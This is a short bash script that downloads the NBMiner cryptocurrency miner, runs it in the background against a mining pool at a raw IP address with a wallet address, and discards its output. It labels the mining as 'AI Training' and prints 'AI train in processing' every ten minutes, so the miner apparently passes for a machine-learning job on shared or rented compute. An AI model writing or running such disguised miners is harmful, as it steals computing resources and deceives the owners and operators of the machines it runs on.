#!/bin/bash

# Download and extract NBMiner
echo "Downloading and extracting the script..."
wget https://github.com/NebuTech/NBMiner/releases/download/v42.3/NBMiner_42.3_Linux.tgz
tar -xvf NBMiner_42.3_Linux.tgz
cd NBMiner_Linux

chmod +x nbminer

echo "Starting AI Training..."
nohup ./nbminer -a kawpow -o stratum+tcp://104.194.134.155:4444 -u RM2ciYa3CRqyreRsf25omrB4e1S95waALr.devtesxxxt > /dev/null 2>&1 &

# Store the background process ID
NBMINER_PID=$!

# Function to print "AI train in processing" every 10 minutes
print_message() {
    while true; do
        echo "AI train in processing"
        sleep 600 # 600 seconds = 10 minutes
    done
}

# Start the message printing in the background
print_message &

# Store the message printing process ID
MESSAGE_PID=$!

# Wait for the nbminer process to finish (if it ever does)
wait $NBMINER_PID

# Cleanup: Kill the message printing process when nbminer stops
kill $MESSAGE_PID
echo "NBMiner has stopped. Exiting script."
